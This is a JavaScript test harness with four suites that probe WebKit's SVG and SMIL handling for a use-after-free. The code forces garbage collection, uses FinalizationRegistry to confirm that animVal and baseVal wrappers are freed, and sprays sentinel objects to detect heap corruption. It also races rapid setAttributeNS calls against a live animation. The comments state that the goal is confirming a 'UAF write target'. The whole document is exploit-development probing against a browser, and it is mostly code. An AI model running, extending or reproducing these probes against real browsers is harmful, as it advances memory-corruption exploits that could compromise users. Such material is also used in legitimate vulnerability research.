<script>
window.onerror=function(msg,src,line,col,err){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}
  return false;
};
window.addEventListener('unhandledrejection',function(e){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[UNHANDLED] '+(e.reason&&e.reason.stack?e.reason.stack:String(e.reason));d.appendChild(p);}
});

var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){
  var d=document.getElementById('out');
  var p=document.createElement('pre');
  if(cls)p.className=cls;
  p.textContent=s;
  d.appendChild(p);
  d.scrollTop=d.scrollHeight;
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{navigator.clipboard.writeText(text).then(function(){
    toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
  }).catch(function(){fb(text,toast);});}
  catch(e){fb(text,toast);}
}
function fb(text,toast){
  var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;top:-9999px';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}catch(e){}
  document.body.removeChild(ta);
}

var _dv=new DataView(new ArrayBuffer(8));
function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
function isExactF32(v){_dv.setFloat32(0,v,true);return _dv.getFloat32(0,true)===v;}

function gcHard(){
  var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
  var t=new Array(200000).fill(null).map(function(){return{};});t=null;
  var a2=[];for(var i=0;i<300000;i++)a2.push({x:i});a2=null;
  try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
}
function gcDOM(){
  var c=document.createElement('div');document.body.appendChild(c);
  for(var i=0;i<5000;i++){var el=document.createElement('span');c.appendChild(el);}
  c.innerHTML='';c.remove();
  for(var j=0;j<500;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
}
function gcFull(){gcHard();gcDOM();gcHard();}

function makeLiveAnimFe(id,from0,to0,dur){
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','200');svg.setAttribute('height','200');
  document.body.appendChild(svg);
  var defs=document.createElementNS(SVG_NS,'defs');svg.appendChild(defs);
  var filt=document.createElementNS(SVG_NS,'filter');filt.id=id;defs.appendChild(filt);
  var vals=[];for(var i=0;i<20;i++)vals.push(i===0?from0:0);
  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
  fe.setAttribute('type','matrix');fe.setAttribute('values',vals.join(' '));
  filt.appendChild(fe);
  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('width','100');rect.setAttribute('height','100');
  rect.setAttribute('filter','url(#'+id+')');
  svg.appendChild(rect);
  var anim=document.createElementNS(SVG_NS,'animate');
  anim.setAttribute('attributeName','values');
  var toVals=[];for(var i=0;i<20;i++)toVals.push(i===0?to0:0);
  anim.setAttribute('from',vals.join(' '));
  anim.setAttribute('to',toVals.join(' '));
  anim.setAttribute('dur',(dur||8)+'s');
  anim.setAttribute('repeatCount','indefinite');
  fe.appendChild(anim);
  try{anim.beginElement();}catch(e){}
  return{svg:svg,filt:filt,fe:fe,anim:anim,rect:rect};
}

var suites={};
function runSuite(name){
  L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');
  try{suites[name]();}
  catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
}
function runAll(){
  ['ADR72','ADR73','ADR74','ADR75'].forEach(function(n){runSuite(n);});
}

// ═══════════════════════════════════════════════════════════════
// ADR72 — FinalizationRegistry: per-frame animVal TearOff GC confirmation
//
// The definitive test: does SMIL hold a RefPtr to the per-frame SVGNumber?
//
// FinalizationRegistry fires its callback when a JS object is GC'd.
// We register each per-frame animVal TearOff with a token.
// After releasing the TearOff and forcing GC, if the callback fires:
//   → JS wrapper (TearOff) was GC'd
//   → BUT: the C++ SVGNumber may still be alive (SMIL holds RefPtr to it)
//   → The JS TearOff being GC'd does not directly tell us if the C++ SVGNumber is freed
//
// So we need to think carefully about what FinalizationRegistry measures:
// - It tracks JAVASCRIPT object death (when the JS object becomes unreachable)
// - The C++ SVGNumber has independent lifetime via RefCounting
// - The JS TearOff being GC'd just means WebKit's JSC GC reclaimed the JS wrapper
// - The underlying C++ SVGNumber might still be alive
//
// However: when the JS TearOff IS GC'd, its JS destructor runs.
// The JS destructor typically calls the C++ TearOff destructor.
// The C++ TearOff destructor releases its RefPtr<SVGNumber>.
// IF SMIL holds no other RefPtr to that SVGNumber, refcount → 0 → freed.
//
// So: FinalizationRegistry firing = JS TearOff freed = C++ TearOff released
//   = C++ TearOff's RefPtr<SVGNumber> decremented
//   IF SMIL holds no RefPtr: SVGNumber freed (UAF possible)
//   IF SMIL holds RefPtr: SVGNumber NOT freed (no UAF)
//
// We can't directly detect if the C++ SVGNumber is freed from JS.
// BUT we can check: does the SMIL animation continue correctly after GC?
// IF animVal.getItem(0).value still changes smoothly after GC of old TearOffs:
//   → SMIL has its own access to the animated value (its own RefPtr path)
//   → Old TearOff's GC didn't break SMIL → SMIL holds RefPtr independently
//
// Test design:
// 1. Start animation
// 2. Collect 20 per-frame TearOffs, register each with FinalizationRegistry
// 3. Release all TearOffs in IIFE
// 4. Force GC 3x
// 5. Check: how many FinalizationRegistry callbacks fired?
// 6. Check: is animation still running? (does animVal still update?)
// 7. Conclusion: if all 20 fired → JS TearOffs GC'd → C++ TearOffs destructed
//    → SMIL's independent RefPtr is the only survivor
// ═══════════════════════════════════════════════════════════════
suites['ADR72']=function(){
  L('ADR72: FinalizationRegistry — per-frame animVal TearOff GC confirmation','info');

  // Check FinalizationRegistry support
  if(typeof FinalizationRegistry==='undefined'){
    L('ADR72: FinalizationRegistry NOT supported in this runtime','miss');
    return;
  }
  L('ADR72: FinalizationRegistry IS supported','hit');

  var gcCount=0;
  var gcTokens=[];
  var registry72=new FinalizationRegistry(function(token){
    gcCount++;
    gcTokens.push(token);
    L('  FinalizationRegistry: GC callback fired for token='+token+' (total gcCount='+gcCount+')','warn');
  });

  var ctx72=makeLiveAnimFe('f72',5000,0,10);
  var frame72=0;
  var collected72=[];

  setTimeout(function(){
    L('ADR72: collecting 20 per-frame animVal TearOffs with FinalizationRegistry...','info');

    function collect72(){
      var t=ctx72.fe.values.animVal.getItem(0);
      registry72.register(t,'frame_'+frame72);
      // IIFE to release immediately (truly zero refs except registry)
      (function(tearoff){tearoff=null;})(t);
      t=null;
      frame72++;
      if(frame72<20) requestAnimationFrame(collect72);
      else afterCollect72();
    }

    function afterCollect72(){
      L('ADR72: 20 TearOffs collected and released. Forcing 3x gcFull...','info');

      // Force GC 3 times
      gcFull();
      var c1=gcCount;
      L('ADR72: after gcFull#1: gcCount='+c1,'info');
      gcFull();
      var c2=gcCount;
      L('ADR72: after gcFull#2: gcCount='+c2,'info');
      gcFull();
      var c3=gcCount;
      L('ADR72: after gcFull#3: gcCount='+c3,'info');

      // Wait for microtask/macrotask queue to drain (FinalizationRegistry fires async)
      setTimeout(function(){
        var finalCount=gcCount;
        L('ADR72: final gcCount after setTimeout drain='+finalCount,'info');
        L('ADR72: total GC callbacks received: '+finalCount+'/20','info');

        if(finalCount>0){
          L('★★★ ADR72: '+finalCount+' TearOffs WERE GC\'d → C++ TearOff destructors ran','hit');
          L('ADR72: GC\'d token IDs: '+gcTokens.join(','),'info');
          L('ADR72: if SMIL held no extra RefPtr → those '+finalCount+' SVGNumbers are now freed','warn');
        } else {
          L('ADR72: 0 TearOffs GC\'d yet (GC may be lazy or TearOffs still reachable somehow)','info');
        }

        // Check: is animation still running?
        var av1=ctx72.fe.values.animVal.getItem(0).value;
        setTimeout(function(){
          var av2=ctx72.fe.values.animVal.getItem(0).value;
          L('ADR72: animVal t=100ms: '+av1.toFixed(3),'info');
          L('ADR72: animVal t=200ms: '+av2.toFixed(3),'info');
          L('ADR72: animation still running after TearOff GC? '+(Math.abs(av1-av2)>0.1?'YES (changing)':'NO (stuck)'),'info');

          // More aggressive GC + time to let FinalizationRegistry drain
          gcFull();gcFull();gcFull();
          setTimeout(function(){
            var veryFinal=gcCount;
            L('ADR72: gcCount after extra 3x gcFull + setTimeout='+veryFinal,'info');
            if(veryFinal>finalCount){
              L('★★★ ADR72: MORE GC callbacks after extra GC (total='+veryFinal+')','hit');
            }
            L('ADR72: final conclusion: '+veryFinal+'/20 TearOff JS objects confirmed GC\'d','info');
            if(veryFinal===20){
              L('★ ADR72: ALL 20 TearOffs GC\'d → JS wrappers released → C++ TearOff destructors ran','hit');
              L('ADR72: SMIL animation '+(Math.abs(av1-av2)>0.1?'STILL RUNNING → SMIL holds its own RefPtr independently':'STOPPED → SMIL had no independent RefPtr'),'warn');
            }
            ctx72.svg.remove();
          },500);
        },100);
      },200);
    }

    requestAnimationFrame(collect72);
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR73 — FinalizationRegistry: orphaned baseVal TearOff GC confirmation
//
// After setAttributeNS, orphaned baseVal TearOff holds the only reference
// to the old SVGNumber. When TearOff is released:
// - JS TearOff becomes unreachable → FinalizationRegistry fires → C++ TearOff destructor
// - C++ TearOff releases RefPtr<SVGNumber>
// - If nobody else holds SVGNumber: freed
// - If nobody else holds old SVGNumberList: freed too
//
// Test:
// 1. Get baseVal TearOff T_bv
// 2. Register T_bv with FinalizationRegistry
// 3. setAttributeNS → T_bv detached/orphaned
// 4. Release T_bv in IIFE
// 5. Force GC
// 6. Check: did FinalizationRegistry fire? → T_bv was GC'd → old SVGNumber freed
//
// If T_bv IS GC'd: the orphaned path DOES free the SVGNumber.
// This confirms the freed object exists. Combined with the write test from ADR68
// (write to orphaned TearOff before release), this gives us UAF timing:
//   - write T_bv.value = X AFTER the underlying list is freed → write to freed list
//   - the write to T_bv's SVGNumber's m_value succeeds (we confirmed this in ADR68)
//   - the notification to list_A = write to freed list_A → UAF in SVGNumberList bin
//
// Also register the SVGNumberList (if accessible) to track list lifetime
// ═══════════════════════════════════════════════════════════════
suites['ADR73']=function(){
  L('ADR73: FinalizationRegistry — orphaned baseVal TearOff GC confirmation','info');

  if(typeof FinalizationRegistry==='undefined'){
    L('ADR73: FinalizationRegistry NOT supported','miss');
    return;
  }

  var tearoffGCd73=false;
  var listGCd73=false;
  var reg73=new FinalizationRegistry(function(token){
    L('  FinalizationRegistry73: GC callback → token='+token,'warn');
    if(token==='tearoff') tearoffGCd73=true;
    if(token==='list') listGCd73=true;
  });

  var svg73=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg73);
  var fe73=document.createElementNS(SVG_NS,'feColorMatrix');
  fe73.setAttribute('type','matrix');
  var init73=[];for(var i=0;i<20;i++)init73.push(i===0?7777:0);
  fe73.setAttribute('values',init73.join(' '));
  svg73.appendChild(fe73);

  // Get baseVal TearOff and register
  var T_bv73=fe73.values.baseVal.getItem(0);
  reg73.register(T_bv73,'tearoff');

  // Try to register the baseVal list itself
  var list73=fe73.values.baseVal;
  reg73.register(list73,'list');

  L('ADR73: T_bv73.value='+T_bv73.value+' (pre-setAttr)','info');
  L('ADR73: registered TearOff and List with FinalizationRegistry','info');

  // setAttributeNS → detaches T_bv73 from fe73's live list
  var newVals73=[];for(var i=0;i<20;i++)newVals73.push(i===0?1234:0);
  fe73.setAttributeNS(null,'values',newVals73.join(' '));

  L('ADR73: setAttributeNS done. T_bv73.value='+T_bv73.value+' (still 7777, detached)','info');
  L('ADR73: live bv[0]='+fe73.values.baseVal.getItem(0).value+' (should be 1234)','info');
  L('ADR73: T_bv73===fresh? '+(T_bv73===fe73.values.baseVal.getItem(0)),'info');

  // Release T_bv73 in IIFE (zero live refs)
  L('ADR73: releasing T_bv73 and list73 in IIFE...','info');
  (function(t,l){t=null;l=null;})(T_bv73,list73);
  T_bv73=null;list73=null;

  // Force GC
  gcFull();

  setTimeout(function(){
    L('ADR73: after gcFull + 300ms:','info');
    L('ADR73: tearoffGCd='+tearoffGCd73,'info');
    L('ADR73: listGCd='+listGCd73,'info');

    if(tearoffGCd73){
      L('★★★ ADR73: baseVal TearOff WAS GC\'d → C++ TearOff destructor ran → RefPtr<SVGNumber> decremented','hit');
      L('ADR73: if nobody else holds that SVGNumber → it was freed → UAF write possible via prior write in ADR68!','warn');
    } else {
      L('ADR73: baseVal TearOff NOT YET GC\'d (may need more GC pressure)','info');
    }

    if(listGCd73){
      L('★★★ ADR73: baseVal LIST was GC\'d → SVGNumberList freed after setAttributeNS → list_A freed!','hit');
      L('ADR73: notification chain from write-to-orphaned-TearOff fires on FREED list_A → UAF write target confirmed','warn');
    } else {
      L('ADR73: baseVal list NOT YET GC\'d (still held by fe73 or browser? or not registered correctly)','info');
    }

    // Extra GC pressure
    gcFull();gcFull();gcFull();
    setTimeout(function(){
      L('ADR73: after extra 3x gcFull:','info');
      L('ADR73: tearoffGCd='+tearoffGCd73,'info');
      L('ADR73: listGCd='+listGCd73,'info');

      // Does feColorMatrix still work? (its live list should be list_B)
      var liveBv=fe73.values.baseVal.getItem(0).value;
      L('ADR73: live fe73 bv[0]='+liveBv+' (should be 1234, list_B intact)','info');

      svg73.remove();
    },600);
  },300);
};

// ═══════════════════════════════════════════════════════════════
// ADR74 — SVGTransformList path — completely different C++ types
//
// SVGElement.transform.animVal gives a live SVGTransformList (not SVGNumberList).
// SVGTransform objects within it are different IsoHeap bins from SVGNumber.
//
// An animated transform element (animateTransform) creates per-frame
// SVGTransform/SVGMatrix objects. Different code path, different refcounting.
//
// Test: animate a rect's transform, collect per-frame animVal TearOffs,
// release them, watch for corruption.
//
// Also: SVGMatrix objects have 6 float fields (a,b,c,d,e,f) — more data
// per object means more observable corruption if UAF occurs.
//
// Key difference from feColorMatrix: SVGTransform.matrix returns an SVGMatrix
// which is a SEPARATE object from the SVGTransform. Two levels of C++ objects
// that each need RefPtr protection.
// ═══════════════════════════════════════════════════════════════
suites['ADR74']=function(){
  L('ADR74: SVGTransformList — animateTransform frame-escape test','info');

  var svg74=document.createElementNS(SVG_NS,'svg');
  svg74.setAttribute('width','200');svg74.setAttribute('height','200');
  document.body.appendChild(svg74);

  var rect74=document.createElementNS(SVG_NS,'rect');
  rect74.setAttribute('width','50');rect74.setAttribute('height','50');
  rect74.setAttribute('transform','translate(0,0)');
  svg74.appendChild(rect74);

  // Animate the transform
  var anim74=document.createElementNS(SVG_NS,'animateTransform');
  anim74.setAttribute('attributeName','transform');
  anim74.setAttribute('attributeType','XML');
  anim74.setAttribute('type','translate');
  anim74.setAttribute('from','0,0');
  anim74.setAttribute('to','100,100');
  anim74.setAttribute('dur','8s');
  anim74.setAttribute('repeatCount','indefinite');
  rect74.appendChild(anim74);
  try{anim74.beginElement();}catch(e){}

  setTimeout(function(){
    // Check: does rect74.transform.animVal work?
    try{
      var avList=rect74.transform.animVal;
      L('ADR74: rect74.transform.animVal type='+typeof avList,'info');
      L('ADR74: animVal.numberOfItems='+avList.numberOfItems,'info');

      if(avList.numberOfItems>0){
        var T74=avList.getItem(0);
        L('ADR74: T74.type='+T74.type+' (4=translate)','info');
        var M74=T74.matrix;
        L('ADR74: matrix e='+M74.e.toFixed(3)+' f='+M74.f.toFixed(3)+' (should be ~0..100)','info');

        // Collect 20 per-frame SVGTransform TearOffs
        var frame74=0;
        var held74=[];

        function collect74(){
          var t=rect74.transform.animVal.getItem(0);
          var m=t.matrix;
          held74.push({t:t,e:m.e,f:m.f,frame:frame74});
          frame74++;
          if(frame74<20) requestAnimationFrame(collect74);
          else afterCollect74();
        }

        function afterCollect74(){
          L('ADR74: 20 SVGTransform TearOffs collected','info');
          L('ADR74: frame[0].e='+held74[0].e.toFixed(3)+' frame[19].e='+held74[19].e.toFixed(3),'info');
          L('ADR74: all different? '+(held74[0].t!==held74[19].t?'YES (per-frame new TearOff)':'NO (same object)'),'info');

          // Alloc sentinel feColorMatrix blocks (still SVGNumber type, but just for comparison)
          var sents74=[];
          for(var i=0;i<50;i++){
            var sv=document.createElementNS(SVG_NS,'svg');document.body.appendChild(sv);
            var fe=document.createElementNS(SVG_NS,'feColorMatrix');
            fe.setAttribute('type','matrix');
            var v=[];for(var k=0;k<20;k++)v.push(k===0?(i+1)*1000:0);
            fe.setAttribute('values',v.join(' '));
            sv.appendChild(fe);
            sents74.push({svg:sv,fe:fe,t:fe.values.baseVal.getItem(0),canary:(i+1)*1000});
          }
          L('ADR74: 50 SVGNumber sentinels allocated','info');

          // Release all 20 SVGTransform TearOffs
          (function(){
            var refs=held74;
            held74=null;
            for(var i=0;i<refs.length;i++){refs[i].t=null;refs[i]=null;}
          })();
          gcFull();gcFull();
          L('ADR74: released all 20 SVGTransform TearOffs + 2x gcFull','info');

          // Check: get fresh TearOff, read matrix
          var fresh74=rect74.transform.animVal.getItem(0);
          var freshM=fresh74.matrix;
          L('ADR74: fresh animVal after release: e='+freshM.e.toFixed(3)+' f='+freshM.f.toFixed(3),'info');

          // Watch 5 frames
          var fw74=0;
          function watch74(){
            fw74++;
            var cur=rect74.transform.animVal.getItem(0).matrix.e;

            // Check sentinels
            var bad74=[];
            sents74.forEach(function(s,i){
              if(Math.abs(s.t.value-s.canary)>0.5) bad74.push({i:i,expected:s.canary,got:s.t.value});
            });

            if(bad74.length>0){
              L('★★★ ADR74 frame+'+fw74+': '+bad74.length+' SVGNumber sentinels CORRUPTED','hit');
              bad74.forEach(function(x){L('  S['+x.i+']: '+x.expected+' → '+x.got.toFixed(3),'hit');});
            } else {
              L('  frame+'+fw74+' SVGTransform e='+cur.toFixed(3)+' sentinels OK','info');
            }

            if(fw74<5) requestAnimationFrame(watch74);
            else {
              L('ADR74: test complete','info');
              sents74.forEach(function(s){s.svg.remove();});
              svg74.remove();
            }
          }
          requestAnimationFrame(watch74);
        }
        requestAnimationFrame(collect74);
      } else {
        L('ADR74: animVal.numberOfItems=0 — no transform items during animation (SMIL animateTransform may work differently)','miss');
        svg74.remove();
      }
    }catch(e){
      L('ADR74 threw: '+(e.stack||e.message),'miss');
      svg74.remove();
    }
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR75 — SVGNumberList bin probe: sentinel TYPE matches freed object type
//
// Problem with v64-68: our sentinels are SVGNumber objects.
// When setAttributeNS frees list_A (SVGNumberList), any UAF write goes
// to the SVGNumberList IsoHeap bin — NOT the SVGNumber bin.
// Different bins = no cross-contamination visible in SVGNumber sentinels.
//
// To detect UAF writes in the SVGNumberList bin, we need SVGNumberList
// sentinels that can OBSERVE their memory being overwritten.
//
// Approach: create many feColorMatrix elements, grab their baseVal list
// objects, track the FIRST item value in each list as a canary.
// After setAttributeNS on ANOTHER element (freeing list_A):
// - The freed list_A has known type: SVGNumberList
// - Our sentinel lists are also SVGNumberList type → same IsoHeap bin
// - If bump-only: probes go to new addresses → sentinels untouched
// - If free-list: probe at list_A's freed slot → DIFFERENT object type
//   (a new SVGNumberList would land there and its [0] value would be 0,
//   while our canary is nonzero) — but this still wouldn't show corruption
//
// Better approach: USE THE SAME ELEMENT
// 1. Create feColorMatrix, get baseVal TearOff T_bv (holds old list_A's SVGNumber)
// 2. setAttributeNS → list_B created, list_A freed (maybe)
// 3. IMMEDIATELY get baseVal of a DIFFERENT feColorMatrix element that was
//    just freshly created — its list might land at list_A's freed slot
// 4. Check: does the fresh list's [0] value = expected default (0)?
//    If it shows garbage → it landed at freed list_A and inherited garbage
//
// Actually the cleanest test: observable UAF through the notification chain write.
// The write path (ADR68) showed the notification chain fires but we don't know
// what it writes to. We need to figure out WHAT ADDRESS the notification writes to.
//
// DIFFERENT APPROACH for ADR75:
// Use multiple rapid setAttributeNS calls to create a "stale pointer race":
// 1. Set up animation
// 2. During SMIL animation: SMIL is reading/writing to list_B's SVGNumber
// 3. Call setAttributeNS very rapidly (5x in same microtask) to cycle through list_C, D, E, F, G
// 4. SMIL might still have a stale pointer to an intermediate list's SVGNumber
// 5. Check animVal after rapid cycling — does it show garbage?
//
// This tests: SMIL's "current animated value" pointer race with rapid attribute cycling
// ═══════════════════════════════════════════════════════════════
suites['ADR75']=function(){
  L('ADR75: SVGNumberList bin probe — rapid setAttr cycle during SMIL write','info');

  var ctx75=makeLiveAnimFe('f75',8000,0,12);

  setTimeout(function(){
    // Part A: rapid setAttributeNS cycling (5 rapid changes)
    L('ADR75-A: rapid setAttr cycling — 5 changes in one microtask','info');

    var avBefore=ctx75.fe.values.animVal.getItem(0).value;
    L('ADR75-A: animVal before rapid setAttr='+avBefore.toFixed(3),'info');

    // RAPID 5x setAttributeNS (all in same synchronous block)
    // SMIL might hold stale ptr to intermediate lists
    var vals_c=[];for(var i=0;i<20;i++)vals_c.push(i===0?100:0);
    ctx75.fe.setAttributeNS(null,'values',vals_c.join(' '));

    var vals_d=[];for(var i=0;i<20;i++)vals_d.push(i===0?200:0);
    ctx75.fe.setAttributeNS(null,'values',vals_d.join(' '));

    var vals_e=[];for(var i=0;i<20;i++)vals_e.push(i===0?300:0);
    ctx75.fe.setAttributeNS(null,'values',vals_e.join(' '));

    var vals_f=[];for(var i=0;i<20;i++)vals_f.push(i===0?400:0);
    ctx75.fe.setAttributeNS(null,'values',vals_f.join(' '));

    var vals_g=[];for(var i=0;i<20;i++)vals_g.push(i===0?500:0);
    ctx75.fe.setAttributeNS(null,'values',vals_g.join(' '));

    L('ADR75-A: 5 rapid setAttributeNS done','info');

    // Check animVal immediately after rapid cycling
    var avAfterSync=ctx75.fe.values.animVal.getItem(0).value;
    L('ADR75-A: animVal immediately after 5x setAttr='+avAfterSync.toFixed(3),'info');
    L('ADR75-A: live bv[0]='+ctx75.fe.values.baseVal.getItem(0).value+' (should be 500)','info');

    // Check for garbage/unexpected values
    if(isNaN(avAfterSync)||!isFinite(avAfterSync)){
      L('★★★ ADR75-A: animVal is NaN/Inf after rapid setAttr — pointer corruption!','hit');
    } else if(avAfterSync<0||avAfterSync>100000){
      L('★★★ ADR75-A: animVal='+avAfterSync.toFixed(3)+' is out of expected range — possible stale ptr read!','warn');
    }

    // Part B: watch animVal for several frames after rapid cycling
    // SMIL should now animate from 500→0 (new base after last setAttr)
    // OR from original 8000→0 (if SMIL cached from-value at animation start)
    var fw75=0;
    function watch75A(){
      fw75++;
      var av=ctx75.fe.values.animVal.getItem(0).value;
      if(isNaN(av)||!isFinite(av)){
        L('★★★ ADR75-B frame+'+fw75+': animVal='+av+' (NaN/Inf — pointer corruption after rapid setAttr!)','hit');
      } else {
        L('  frame+'+fw75+' animVal='+av.toFixed(3),'info');
      }
      if(fw75<5) requestAnimationFrame(watch75A);
      else continuePart75B();
    }
    requestAnimationFrame(watch75A);

    function continuePart75B(){
      L('ADR75-C: rapid setAttr DURING animVal TearOff hold','info');

      // Hold an animVal TearOff WHILE rapidly changing the attribute
      var held75=ctx75.fe.values.animVal.getItem(0);
      var heldVal=held75.value;
      L('ADR75-C: held75.value before rapid setAttr='+heldVal.toFixed(3),'info');

      // Rapid setAttributeNS while holding animVal TearOff
      for(var r75=0;r75<10;r75++){
        var v75=[];for(var k=0;k<20;k++)v75.push(k===0?(r75+1)*50:0);
        ctx75.fe.setAttributeNS(null,'values',v75.join(' '));
      }

      L('ADR75-C: 10 rapid setAttributeNS while holding animVal TearOff','info');
      L('ADR75-C: held75.value after 10x setAttr='+held75.value.toFixed(3),'info');

      if(isNaN(held75.value)||!isFinite(held75.value)){
        L('★★★ ADR75-C: held animVal TearOff reads garbage after rapid setAttr!','hit');
      }

      // Write to held animVal TearOff after rapid setAttr
      L('ADR75-C: writing to held animVal TearOff after rapid setAttr','info');
      try{
        held75.value=55555; // this should throw (animVal is read-only)
        L('ADR75-C: write to animVal did NOT throw (unexpected) — value='+held75.value,'warn');
      }catch(e){
        L('ADR75-C: write to animVal threw (expected — read-only): '+e.message,'info');
      }

      // Release held TearOff
      held75=null;
      gcFull();
      L('ADR75-C: held TearOff released + gcFull','info');

      // Part D: what does animVal read now after all the rapid cycling?
      var av75Final=ctx75.fe.values.animVal.getItem(0).value;
      L('ADR75-D: animVal after all tests='+av75Final.toFixed(3),'info');

      // Watch 3 more frames
      var fw75D=0;
      function watch75D(){
        fw75D++;
        var av=ctx75.fe.values.animVal.getItem(0).value;
        if(isNaN(av)||!isFinite(av)){
          L('★★★ ADR75-D frame+'+fw75D+': NaN animVal — corruption!','hit');
        } else {
          L('  frame+'+fw75D+' animVal='+av.toFixed(3),'info');
        }
        if(fw75D<3) requestAnimationFrame(watch75D);
        else {
          L('ADR75: all parts complete','info');
          ctx75.svg.remove();
        }
      }
      requestAnimationFrame(watch75D);
    }
  },300);
};
